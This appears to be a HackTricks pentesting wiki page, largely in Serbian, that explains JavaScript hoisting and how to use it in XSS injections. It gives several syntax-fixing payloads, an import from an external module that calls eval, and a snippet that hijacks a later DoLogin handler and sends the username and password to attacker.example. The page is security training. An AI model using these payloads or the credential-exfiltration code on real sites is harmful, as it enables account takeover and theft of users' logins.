# JS Hoisting

{{#include ../../banners/hacktricks-training.md}}

## Osnovne informacije

U jeziku JavaScript opisuje se mehanizam poznat kao **Hoisting**, pri kojem se deklaracije promenljivih, funkcija, klasa ili imports konceptualno podižu na vrh njihovog opsega pre nego što se kod izvrši. Ovaj proces automatski obavlja JavaScript engine, koji prolazi kroz skriptu u više prolaza.

Tokom prvog prolaza, engine parsira kod da bi proverio sintaksne greške i transformisao ga u apstraktno sintaksno stablo. Ova faza uključuje hoisting, proces u kojem se određene deklaracije pomeraju na vrh konteksta izvršavanja. Ako faza parsiranja uspe, što znači da nema sintaksnih grešaka, izvršavanje skripte može da se nastavi.

Važno je razumeti da:

1. Skripta mora biti bez sintaksnih grešaka da bi se izvršila. Pravila sintakse moraju biti striktno poštovana.
2. Pozicija koda u okviru skripte utiče na izvršavanje zbog hoistinga, iako se izvršeni kod može razlikovati od njegove tekstualne reprezentacije.

#### Tipovi Hoistinga

Na osnovu informacija sa MDN, postoje četiri različita tipa hoistinga u JavaScriptu:

1. **Value Hoisting**: Omogućava upotrebu vrednosti promenljive unutar njenog opsega pre linije njene deklaracije.
2. **Declaration Hoisting**: Dozvoljava referenciranje promenljive unutar njenog opsega pre njene deklaracije bez izazivanja `ReferenceError`, ali vrednost promenljive biće `undefined`.
3. Ovaj tip menja ponašanje unutar svog opsega zbog deklaracije promenljive pre stvarne linije njene deklaracije.
4. Sporedni efekti deklaracije se dešavaju pre nego što se ostatak koda koji je sadrži evaluira.

Detaljnije, deklaracije funkcija pokazuju ponašanje tipa 1 hoistinga. Ključna reč `var` demonstrira ponašanje tipa 2. Leksičke deklaracije, koje uključuju `let`, `const` i `class`, pokazuju ponašanje tipa 3. Na kraju, `import` statements su jedinstveni po tome što se hoistuju sa ponašanjem tipa 1 i tipa 4.

## Scenariji

Dakle, ako imate scenarije u kojima možete **Inject JS code after an undeclared object** is used, možete **fix the syntax** tako što ćete ga deklarisati (tako da se vaš kod izvrši umesto da baci grešku):
```javascript
// The function vulnerableFunction is not defined
vulnerableFunction('test', '<INJECTION>');
// You can define it in your injection to execute JS
//Payload1: param='-alert(1)-'')%3b+function+vulnerableFunction(a,b){return+1}%3b
'-alert(1)-''); function vulnerableFunction(a,b){return 1};

//Payload2: param=test')%3bfunction+vulnerableFunction(a,b){return+1}%3balert(1)
test'); function vulnerableFunction(a,b){ return 1 };alert(1)
```

```javascript
// If a variable is not defined, you could define it in the injection
// In the following example var a is not defined
function myFunction(a,b){
return 1
};
myFunction(a, '<INJECTION>')

//Payload: param=test')%3b+var+a+%3d+1%3b+alert(1)%3b
test'); var a = 1; alert(1);
```

```javascript
// If an undeclared class is used, you cannot declare it AFTER being used
var variable = new unexploitableClass();
<INJECTION>
// But you can actually declare it as a function, being able to fix the syntax with something like:
function unexploitableClass() {
return 1;
}
alert(1);
```

```javascript
// Properties are not hoisted
// So the following examples where the 'cookie' attribute doesn´t exist
// cannot be fixed if you can only inject after that code:
test.cookie("leo", "INJECTION")
test[("cookie", "injection")]
```
## Više scenarija
```javascript
// Undeclared var accessing to an undeclared method
x.y(1,INJECTION)
// You can inject
alert(1));function x(){}//
// And execute the allert with (the alert is resolved before it's detected that the "y" is undefined
x.y(1,alert(1));function x(){}//)
```

```javascript
// Undeclared var accessing 2 nested undeclared method
x.y.z(1,INJECTION)
// You can inject
");import {x} from "https://example.com/module.js"//
// It will be executed
x.y.z("alert(1)");import {x} from "https://example.com/module.js"//")


// The imported module:
// module.js
var x = {
y: {
z: function(param) {
eval(param);
}
}
};

export { x };
```

```javascript
// In this final scenario from https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/
// It was injected the: let config;`-alert(1)`//`
// With the goal of making in the block the var config be empty, so the return is not executed
// And the same injection was replicated in the body URL to execute an alert

try {
if (config) {
return
}
// TODO handle missing config for: https://try-to-catch.glitch.me/"+`
let config
;`-alert(1)` //`+"
} catch {
fetch("/error", {
method: "POST",
body: {
url:
"https://try-to-catch.glitch.me/" +
`
let config;` -
alert(1) -
`//` +
"",
},
})
}
trigger()
```
### Spreči kasnije deklaracije zaključavanjem imena pomoću const

Ako možete izvršiti kod pre nego što se top-level `function foo(){...}` parsira, deklarisanjem leksičkog vezivanja istog imena (npr. `const foo = ...`) sprečićete kasniju deklaraciju funkcije da ponovo veže taj identifikator. Ovo se može zloupotrebiti u RXSS da bi se preoteli kritični handleri definisani kasnije na stranici:
```javascript
// Malicious code runs first (e.g., earlier inline <script>)
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value)
const user = Trim(FormInput.InputUtente.value)
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd))
}

// Later, the legitimate page tries to declare:
function DoLogin(){ /* ... */ } // cannot override the existing const binding
```
Napomene
- Ovo zavisi od redosleda izvršavanja i globalnog (top-level) opsega.
- Ako se vaš payload izvršava unutar `eval()`, imajte na umu da su `const/let` unutar `eval` block-scoped i neće napraviti globalne binding-e. Ubacite novi `<script>` element sa kodom da uspostavite pravi globalni `const`.

## Reference

- [https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios](https://jlajara.gitlab.io/Javascript_Hoisting_in_XSS_Scenarios)
- [https://developer.mozilla.org/en-US/docs/Glossary/Hoisting](https://developer.mozilla.org/en-US/docs/Glossary/Hoisting)
- [https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/](https://joaxcar.com/blog/2023/12/13/having-some-fun-with-javascript-hoisting/)
- [From "Low-Impact" RXSS to Credential Stealer: A JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)

{{#include ../../banners/hacktricks-training.md}}
